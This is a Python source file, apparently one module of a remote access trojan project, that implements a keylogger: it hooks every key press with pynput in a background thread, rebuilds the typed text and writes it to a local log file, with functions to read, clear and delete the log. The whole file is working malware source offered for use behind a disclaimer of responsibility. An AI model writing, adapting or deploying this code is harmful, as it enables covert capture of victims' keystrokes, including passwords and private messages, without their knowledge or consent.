# Python RAT project by average-joe44
# Does NOT Responsible for any use case!

from pynput.keyboard import Listener
import threading
import re
import os

class Keylogger:
    cursor = 0
    tombol = []
    hitung = 0
    path = 'baca_log.txt'

    def start_listener(self):
        global listener
        with Listener(on_press=self.key_pressed) as listener:
            listener.join()

    def start_log(self):
        self.t = threading.Thread(target=self.start_listener)
        self.t.start()

    def key_pressed(self, key):
        self.tombol.append(key)
        self.hitung += 1
        if self.hitung >= 1:
            self.hitung = 0
            with open(self.path, 'a') as file:
                for i in self.tombol:
                    with open(self.path, 'a') as file:
                        for i in self.tombol:
                            i = re.sub("'", "", str(i))
                            if i == "Key.enter":
                                data = open(self.path, 'r').read()
                                data = data[:self.cursor] + "\n" + data[self.cursor:]
                                self.cursor += 1
                                open(self.path, 'w').write(data)
                            elif i in ("Key.shift",
                                    "Key.shift_r",
                                    "Key.ctrl",
                                    "Key.ctrl_r",
                                    "Key.ctrl_l",
                                    "Key.alt",
                                    "Key.alt_r",
                                    "Key.alt_gr",
                                    "Key.cmd",          
                                    "Key.menu",
                                    "Key.caps_lock",
                                    "Key.num_lock",
                                    "Key.scroll_lock",
                                    "Key.escape",
                                    "Key.print_screen",
                                    "Key.delete",
                                    "Key.pause",
                                    "Key.f1", "Key.f2", "Key.f3", "Key.f4",
                                    "Key.f5", "Key.f6", "Key.f7", "Key.f8",
                                    "Key.f9", "Key.f10", "Key.f11", "Key.f12"):
                                pass
                            elif i == "Key.backspace":
                                if self.cursor > 0:
                                    data = open(self.path, "r").read()
                                    data = data[:self.cursor-1] + data[self.cursor:]
                                    self.cursor -= 1
                                    open(self.path, 'w').write(data)
                            elif i == "Key.space":
                                data = open(self.path, 'r').read()
                                data = data[:self.cursor] + " " + data[self.cursor:]
                                self.cursor += 1
                                open(self.path, 'w').write(data)
                            elif i == "Key.up":
                                data = open(self.path, "r").read()
                                pos = data.rfind("\n", 0, self.cursor)
                                if pos != -1:
                                    self.cursor = pos
                            elif i == "Key.down":
                                data = open(self.path, "r").read()
                                pos = data.find("\n", self.cursor)
                                if pos != -1:
                                    self.cursor = pos + 1
                            elif i == "Key.right":
                                data = open(self.path, "r").read()
                                if self.cursor < len(data):
                                    self.cursor += 1
                            elif i == "Key.left":
                                if self.cursor > 0:
                                    self.cursor -= 1
                            elif i == "Key.tab":
                                file.write(" [tab] ")
                            elif i == "Key.caps_lock":
                                file.write(" [cpslk] ")
                            else:
                                data = open(self.path, "r").read()
                                data = data[:self.cursor] + i + data[self.cursor:]
                                self.cursor += 1
                                open(self.path, "w").write(data)
        self.tombol = []
    def baca_log(self):
        with open('baca_log.txt', 'r') as file:
            data = file.read()
            return data

    def stop_listener(self):
        listener.stop()
        os.remove(self.path)
    
    def clear_log(self):
        with open('baca_log.txt', 'r+') as f:
            f.truncate(0)
            
